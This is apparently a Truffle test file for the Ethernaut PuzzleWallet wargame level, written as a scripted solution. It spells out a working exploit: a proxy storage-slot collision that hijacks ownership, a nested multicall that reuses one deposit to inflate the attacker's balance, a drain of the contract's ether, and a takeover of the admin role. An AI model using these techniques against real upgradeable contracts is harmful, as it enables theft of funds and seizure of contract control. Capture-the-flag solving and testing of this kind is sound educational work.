const PuzzleProxy  = artifacts.require('PuzzleProxy');
const PuzzleWalletFactory = artifacts.require('PuzzleWalletFactory')
const PuzzleWallet = artifacts.require('PuzzleWallet')
const Ethernaut = artifacts.require('./Ethernaut.sol')

const utils = require('../utils/TestUtils')

contract('PuzzleWallet', function([player]) {
  let ethernaut, level;

  beforeEach(async function() {
    ethernaut = await Ethernaut.new();
    level = await PuzzleWalletFactory.new()
    await ethernaut.registerLevel(level.address)
  });

  it('should allow the player to solve the level', async function() {
    const instance = await utils.createLevelInstance(
      ethernaut, level.address, player, PuzzleWallet,
      { from: player, value: web3.utils.toWei('1', 'ether') },
    );

    // checks that the initial owner address is the puzzle wallet factory contract
    assert.equal(level.address, await instance.owner(), "PuzzleFactory is not the owner");
    assert.equal(web3.utils.toWei('1', 'ether'), (await instance.balances(level.address)).toString());

    const balance = await instance.maxBalance();
    const proxy = await PuzzleProxy.at(instance.address);

    // overwrites the owner address by setting the pendingAdmin
    await proxy.proposeNewAdmin(player);

    // checks that the player has placed their address in the owner slot
    assert.equal(player, await instance.owner(), "Player is not the owner");

    // checks that player is not whitelisted yet
    assert.isFalse(await instance.whitelisted(player), 'Player is not whitelisted');

    // player whitelists herself
    await instance.addToWhitelist(player, { from: player });

    const { data: depositData } = await instance.deposit.request()
    const { data: nestedMulticallData } = await instance.multicall.request([ depositData ]);
    const { data: executeData } = await instance.execute.request(player, web3.utils.toWei('2', 'ether'), []);

    const calls = [
      depositData,
      nestedMulticallData,
      executeData,
    ];

    await instance.multicall(calls, { from: player, value: web3.utils.toWei('1', 'ether')});
    // checks that balance in the contract is 0
    assert.equal(await web3.eth.getBalance(instance.address), 0);

    // updates the maxBalance to take over adminship
    await instance.setMaxBalance(player, { from: player });
    assert.equal(await proxy.admin(), player);

    // check that the level was completed successfully
    const ethCompleted = await utils.submitLevelInstance(
      ethernaut,
      level.address,
      instance.address,
      player
    );

    assert.equal(ethCompleted, true);
  });
});
